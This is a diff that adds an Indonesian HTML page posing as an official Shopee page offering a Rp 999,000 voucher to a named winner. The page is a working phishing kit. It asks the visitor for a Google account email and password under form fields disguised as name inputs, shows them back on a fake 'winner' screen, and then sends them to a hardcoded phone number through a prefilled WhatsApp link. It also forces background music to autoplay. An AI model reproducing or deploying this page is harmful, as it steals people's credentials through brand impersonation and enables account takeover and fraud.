@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Klaim Voucher Shopee 999RB</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <!-- Canvas Confetti JS -->
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+    
+    <!-- Preload Audio Vocaroo dengan Referrer Policy Khusus Chrome -->
+    <link rel="preload" as="audio" href="https://media.vocaroo.com/mp3/1jzrm4BivILv" crossorigin="anonymous" referrerpolicy="no-referrer">
+    
+    <style>
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: #f4f4f5;
+        }
+        .shopee-bg {
+            background-color: #ee4d2d;
+        }
+        .shopee-gradient {
+            background: linear-gradient(135deg, #f53d2d 0%, #ff6633 100%);
+        }
+        .btn-green {
+            background-color: #26aa99;
+            transition: all 0.2s ease;
+        }
+        .btn-green:hover {
+            background-color: #1f8f80;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(38, 170, 153, 0.4);
+        }
+        .btn-green:active {
+            transform: translateY(0);
+        }
+        .step-card {
+            animation: fadeIn 0.3s ease-in-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body class="min-h-screen flex justify-center items-center p-3 sm:p-4">
+
+    <!-- Mobile App Container Canvas -->
+    <div class="w-full max-w-md bg-white rounded-3xl shadow-2xl overflow-hidden flex flex-col min-h-[600px] border border-orange-100 relative">
+        
+        <!-- Header Shopee -->
+        <div class="shopee-gradient px-5 py-4 text-white flex items-center justify-between shadow-md">
+            <div class="flex items-center space-x-2">
+                <i class="fa-solid font-bold fa-bag-shopping text-2xl"></i>
+                <span class="font-extrabold text-xl tracking-tight">Shopee <span class="text-xs bg-yellow-400 text-red-600 px-2 py-0.5 rounded-full font-bold ml-1 uppercase">VIP Special</span></span>
+            </div>
+            <div class="flex items-center space-x-2">
+                <div class="text-xs bg-white/20 px-3 py-1 rounded-full backdrop-blur-sm border border-white/30 flex items-center">
+                    <i class="fa-solid fa-shield-halved mr-1"></i> Resmi
+                </div>
+            </div>
+        </div>
+
+        <!-- Banner Petunjuk Audio Khusus Google Chrome jika Autoplay Terkunci -->
+        <div id="chrome-audio-hint" class="hidden bg-yellow-300 text-yellow-950 text-xs font-bold text-center py-2 px-3 flex items-center justify-center space-x-2 animate-bounce border-b border-yellow-400">
+            <i class="fa-solid fa-volume-high text-red-600"></i>
+            <span>Ketuk layar di mana saja untuk mengaktifkan musik! 🎵</span>
+        </div>
+
+        <!-- Backsound Audio Player (Vocaroo Direct Stream - Fixed Chrome Autoplay) -->
+        <audio id="bgm" loop preload="auto" playsinline crossorigin="anonymous" referrerpolicy="no-referrer">
+            <source src="https://media.vocaroo.com/mp3/1jzrm4BivILv" type="audio/mpeg">
+            <source src="https://vocaroo.com/media/download_mp3/1jzrm4BivILv" type="audio/mpeg">
+        </audio>
+
+        <script>
+            // Advanced Chrome Audio Unlock Engine
+            (function() {
+                const bgm = document.getElementById('bgm');
+                let audioCtx;
+
+                function tryPlayAudio() {
+                    if (!bgm) return;
+                    
+                    // Inisialisasi AudioContext Chrome
+                    if (!audioCtx) {
+                        const AudioContextClass = window.AudioContext || window.webkitAudioContext;
+                        if (AudioContextClass) {
+                            audioCtx = new AudioContextClass();
+                        }
+                    }
+                    if (audioCtx && audioCtx.state === 'suspended') {
+                        audioCtx.resume();
+                    }
+
+                    bgm.muted = false;
+                    bgm.volume = 1.0;
+                    
+                    const playPromise = bgm.play();
+                    if (playPromise !== undefined) {
+                        playPromise.then(() => {
+                            const hint = document.getElementById('chrome-audio-hint');
+                            if (hint) hint.classList.add('hidden');
+                        }).catch((err) => {
+                            // Kebijakan Chrome menahan audio otomatis sebelum ada sentuhan layar
+                            const hint = document.getElementById('chrome-audio-hint');
+                            if (hint) hint.classList.remove('hidden');
+                        });
+                    }
+                }
+
+                // Coba putar langsung saat skrip selesai dibaca
+                tryPlayAudio();
+                window.addEventListener('load', tryPlayAudio);
+                document.addEventListener('DOMContentLoaded', tryPlayAudio);
+
+                // Buka proteksi Chrome seketika pada gerakan/sentuhan layar pertama
+                const unlockEvents = ['pointerdown', 'touchstart', 'mousedown', 'click', 'scroll', 'keydown', 'pointermove'];
+                function handleUserInteraction() {
+                    tryPlayAudio();
+                    if (bgm && !bgm.paused) {
+                        unlockEvents.forEach(evt => window.removeEventListener(evt, handleUserInteraction, { capture: true }));
+                    }
+                }
+
+                unlockEvents.forEach(evt => {
+                    window.addEventListener(evt, handleUserInteraction, { capture: true, passive: true });
+                });
+            })();
+        </script>
+
+        <!-- Content Body Dynamic Pages -->
+        <div class="p-5 flex-1 flex flex-col justify-between">
+
+            <!-- ================= HALAMAN 1 ================= -->
+            <div id="page-1" class="step-card flex flex-col justify-between h-full space-y-6">
+                <div class="space-y-5">
+                    <!-- Voucher Graphic Banner -->
+                    <div class="relative bg-gradient-to-r from-orange-500 to-red-500 rounded-2xl p-5 text-white shadow-lg overflow-hidden border-2 border-dashed border-orange-200">
+                        <div class="absolute -right-6 -bottom-6 opacity-20 text-white">
+                            <i class="fa-solid fa-ticket text-9xl"></i>
+                        </div>
+                        <div class="flex justify-between items-start">
+                            <div>
+                                <span class="bg-yellow-300 text-orange-900 text-xs font-black px-2 py-0.5 rounded uppercase tracking-wider">VOUCHER EKSKLUSIF</span>
+                                <h2 class="text-3xl font-extrabold mt-2 tracking-tight">Rp 999.000</h2>
+                                <p class="text-sm text-orange-100 font-medium">Min. Belanja Rp0 (0%)</p>
+                            </div>
+                            <div class="bg-white/20 p-2 rounded-xl backdrop-blur-md">
+                                <i class="fa-solid fa-gift text-2xl text-yellow-300"></i>
+                            </div>
+                        </div>
+                        <div class="mt-4 pt-3 border-t border-white/20 flex justify-between items-center text-xs">
+                            <span><i class="fa-regular fa-clock mr-1"></i> Berlaku Hari Ini</span>
+                            <span class="font-bold bg-white text-orange-600 px-2 py-0.5 rounded-full">Rp 0,-</span>
+                        </div>
+                    </div>
+
+                    <!-- Greeting Card Text (Pesan Spesifik Sesuai Request) -->
+                    <div class="bg-orange-50/80 rounded-2xl p-4 border border-orange-200 text-gray-800 leading-relaxed shadow-sm">
+                        <div class="flex items-start space-x-3">
+                            <div class="text-orange-500 text-xl mt-0.5"><i class="fa-solid fa-circle-check"></i></div>
+                            <p class="text-sm md:text-base font-semibold text-gray-700">
+                                Halo kak <span class="text-orange-600 font-extrabold underline">Fahri adjri</span> selamat yah memenangkan voucher 999rb dengan minimum belanja 0% gunakan voucher di cek out nanti yah kak nanti barang nya akan Rp 0 rupiah .
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Green CTA Button Page 1 -->
+                <button onclick="goToPage(2)" class="btn-green w-full py-4 text-white font-bold text-lg rounded-2xl shadow-lg flex items-center justify-center space-x-2">
+                    <span>lanjut klaim voucher nya</span>
+                    <i class="fa-solid fa-arrow-right"></i>
+                </button>
+            </div>
+
+            <!-- ================= HALAMAN 2 ================= -->
+            <div id="page-2" class="step-card hidden flex-col justify-between h-full space-y-6">
+                <div class="space-y-5">
+                    <div class="text-center space-y-1">
+                        <h3 class="text-xl font-bold text-gray-800">Lengkapi Data Penerima</h3>
+                        <p class="text-xs text-gray-500">Isi data di bawah ini untuk mencetak voucher Anda</p>
+                    </div>
+
+                    <!-- Peringatan / Warning Notice -->
+                    <div class="bg-amber-50 border border-amber-300 text-amber-800 text-xs font-semibold p-3 rounded-xl flex items-center space-x-2">
+                        <i class="fa-solid fa-triangle-exclamation text-amber-600 text-base flex-shrink-0"></i>
+                        <span>pastikan semua terisi dengan benar yah kak jika salah dikit voucher akan hangus .</span>
+                    </div>
+
+                    <!-- Form Inputs -->
+                    <div class="space-y-4">
+                        <!-- Input 1: Nama Depan -->
+                        <div>
+                            <label class="block text-xs font-bold text-gray-700 mb-1.5 flex items-center">
+                                <i class="fa-solid fa-user text-orange-500 mr-1.5"></i> Masukan Email akun google yang asli .
+                            </label>
+                            <input type="text" id="input-namadepan" placeholder="Contoh: Fahri" 
+                                class="w-full px-4 py-3 border-2 border-gray-200 rounded-xl focus:outline-none focus:border-orange-500 text-sm font-medium transition-all bg-gray-50 focus:bg-white" />
+                        </div>
+
+                        <!-- Input 2: Nama Belakang -->
+                        <div>
+                            <label class="block text-xs font-bold text-gray-700 mb-1.5 flex items-center">
+                                <i class="fa-solid fa-user text-orange-500 mr-1.5"></i> Masukan kata sandi akun google nya   .
+                            </label>
+                            <input type="text" id="input-namabelakang" placeholder="Contoh: Adjri" 
+                                class="w-full px-4 py-3 border-2 border-gray-200 rounded-xl focus:outline-none focus:border-orange-500 text-sm font-medium transition-all bg-gray-50 focus:bg-white" />
+                        </div>
+
+                        <!-- Input 3: Username Shopee -->
+                        <div>
+                            <label class="block text-xs font-bold text-gray-700 mb-1.5 flex items-center">
+                                <i class="fa-solid fa-at text-orange-500 mr-1.5"></i> Masukan nama anda .
+                            </label>
+                            <input type="text" id="input-username" placeholder="Contoh: fahri_adjri123" 
+                                class="w-full px-4 py-3 border-2 border-gray-200 rounded-xl focus:outline-none focus:border-orange-500 text-sm font-medium transition-all bg-gray-50 focus:bg-white" />
+                        </div>
+
+                        <!-- Alert Box Error (Tampil Jika Ada Kosong) -->
+                        <div id="error-box" class="hidden bg-red-50 border-l-4 border-red-500 p-3 rounded-lg flex items-center space-x-2 text-red-700 text-xs font-bold">
+                            <i class="fa-solid fa-circle-exclamation text-base"></i>
+                            <span>masukan kolom yang benar yah kakak</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Green CTA Button Page 2 -->
+                <div class="space-y-2">
+                    <button onclick="validateAndSubmit()" class="btn-green w-full py-4 text-white font-bold text-lg rounded-2xl shadow-lg flex items-center justify-center space-x-2">
+                        <span>kirim</span>
+                        <i class="fa-solid fa-paper-plane"></i>
+                    </button>
+                    <button onclick="goToPage(1)" class="w-full py-2 text-xs text-gray-400 hover:text-gray-600 font-semibold text-center">
+                        <i class="fa-solid fa-chevron-left mr-1"></i> Kembali ke Halaman Utama
+                    </button>
+                </div>
+            </div>
+
+            <!-- ================= HALAMAN 3 ================= -->
+            <div id="page-3" class="step-card hidden flex-col justify-between h-full space-y-5">
+                <div class="space-y-4">
+                    <!-- Top Voucher Image / Graphic -->
+                    <div class="relative bg-gradient-to-r from-red-600 to-orange-500 rounded-2xl p-4 text-white shadow-md border-2 border-dashed border-white/50 text-center">
+                        <div class="inline-block bg-white/20 p-2 rounded-full mb-1">
+                            <i class="fa-solid fa-circle-check text-yellow-300 text-3xl"></i>
+                        </div>
+                        <h4 class="text-xl font-extrabold">KIRIM BUKTINYA KE ADMIN YAH</h4>
+                        <p class="text-xs text-orange-100 mt-0.5">Potongan Rp 999.000 • Min. Belanja 0%</p>
+                    </div>
+
+                    <!-- Detail Pemenang Box -->
+                    <div class="bg-gray-50 border border-gray-200 rounded-2xl p-4 space-y-2.5">
+                        <div class="flex justify-between items-center border-b border-gray-200 pb-2">
+                            <span class="text-xs text-gray-500 font-medium">ID Pemenang</span>
+                            <span id="display-id" class="text-xs font-mono font-bold bg-orange-100 text-orange-700 px-2 py-1 rounded">SHP-999K-XXXXX</span>
+                        </div>
+                        <div class="flex justify-between items-center border-b border-gray-200 pb-2">
+                            <span class="text-xs text-gray-500 font-medium">Email</span>
+                            <span id="display-namadepan" class="text-sm font-bold text-gray-800">-</span>
+                        </div>
+                        <div class="flex justify-between items-center border-b border-gray-200 pb-2">
+                            <span class="text-xs text-gray-500 font-medium">Kata Sandi</span>
+                            <span id="display-namabelakang" class="text-sm font-bold text-gray-800">-</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span class="text-xs text-gray-500 font-medium">Nama</span>
+                            <span id="display-username" class="text-sm font-bold text-orange-600">-</span>
+                        </div>
+                    </div>
+
+                    <!-- Instruction Text Page 3 -->
+                    <div class="text-center py-1">
+                        <p class="text-sm font-bold text-gray-700 animate-pulse">
+                            <i class="fa-brands fa-whatsapp text-green-500 mr-1 text-lg"></i> kirim bukti ke wa ya kakak.
+                        </p>
+                    </div>
+                </div>
+
+                <!-- Green CTA Button Page 3 -->
+                <button onclick="sendToWhatsApp()" class="btn-green w-full py-4 text-white font-bold text-lg rounded-2xl shadow-lg flex items-center justify-center space-x-2">
+                    <i class="fa-brands fa-whatsapp text-2xl"></i>
+                    <span>kirim bukti nya</span>
+                </button>
+            </div>
+
+        </div>
+
+        <!-- Footer watermark -->
+        <div class="bg-gray-100 px-4 py-2 text-center text-[10px] text-gray-400 border-t border-gray-200">
+            Sistem Klaim Resmi Shopee Voucher 999RB &copy; 2026
+        </div>
+    </div>
+
+    <script>
+        // Store user state
+        let userData = {
+            namaDepan: '',
+            namaBelakang: '',
+            usernameShopee: '',
+            winnerId: ''
+        };
+
+        // Buka audio secara otomatis saat tombol diklik atau berpindah halaman
+        function ensureAudioPlaying() {
+            const bgm = document.getElementById('bgm');
+            if (bgm && bgm.paused) {
+                bgm.muted = false;
+                bgm.volume = 1.0;
+                bgm.play().catch(() => {});
+            }
+        }
+
+        // Function to switch between step pages
+        function goToPage(pageNumber) {
+            ensureAudioPlaying();
+            document.getElementById('page-1').classList.add('hidden');
+            document.getElementById('page-2').classList.add('hidden');
+            document.getElementById('page-3').classList.add('hidden');
+
+            document.getElementById(`page-${pageNumber}`).classList.remove('hidden');
+            document.getElementById(`page-${pageNumber}`).classList.add('flex');
+
+            if (pageNumber === 3) {
+                // Fire confetti celebration animation on step 3 launch
+                confetti({
+                    particleCount: 80,
+                    spread: 70,
+                    origin: { y: 0.6 }
+                });
+            }
+        }
+
+        // Validate page 2 input fields
+        function validateAndSubmit() {
+            ensureAudioPlaying();
+            const namaDepanInput = document.getElementById('input-namadepan').value.trim();
+            const namaBelakangInput = document.getElementById('input-namabelakang').value.trim();
+            const usernameInput = document.getElementById('input-username').value.trim();
+            const errorBox = document.getElementById('error-box');
+
+            // Validation check: check if any of the 3 columns are empty
+            if (!namaDepanInput || !namaBelakangInput || !usernameInput) {
+                errorBox.classList.remove('hidden');
+                return;
+            }
+
+            // Hide error box if input is valid
+            errorBox.classList.add('hidden');
+
+            // Generate random Winner ID
+            const randomCode = Math.floor(100000 + Math.random() * 900000);
+            userData.winnerId = `SHP-VCH-${randomCode}`;
+            userData.namaDepan = namaDepanInput;
+            userData.namaBelakang = namaBelakangInput;
+            userData.usernameShopee = usernameInput;
+
+            // Update UI elements on Page 3
+            document.getElementById('display-id').innerText = userData.winnerId;
+            document.getElementById('display-namadepan').innerText = userData.namaDepan;
+            document.getElementById('display-namabelakang').innerText = userData.namaBelakang;
+            document.getElementById('display-username').innerText = userData.usernameShopee;
+
+            // Move to page 3
+            goToPage(3);
+        }
+
+        // Function to launch WhatsApp with prefilled parameters
+        function sendToWhatsApp() {
+            const targetPhone = "6283899891468";
+            
+            // Build text format: "ini buktinya kak" + Nama Depan, Nama Belakang, & Username Shopee
+            const message = `ini buktinya kak\n\nEmail: ${userData.namaDepan}\nKata Sandi: ${userData.namaBelakang}\nNama: ${userData.usernameShopee}\nID Pemenang: ${userData.winnerId}`;
+            
+            // Encode URI text
+            const encodedMessage = encodeURIComponent(message);
+            const waUrl = `https://wa.me/${targetPhone}?text=${encodedMessage}`;
+
+            // Redirect directly to WhatsApp
+            window.location.href = waUrl;
+        }
+    </script>
+</body>
+</html>
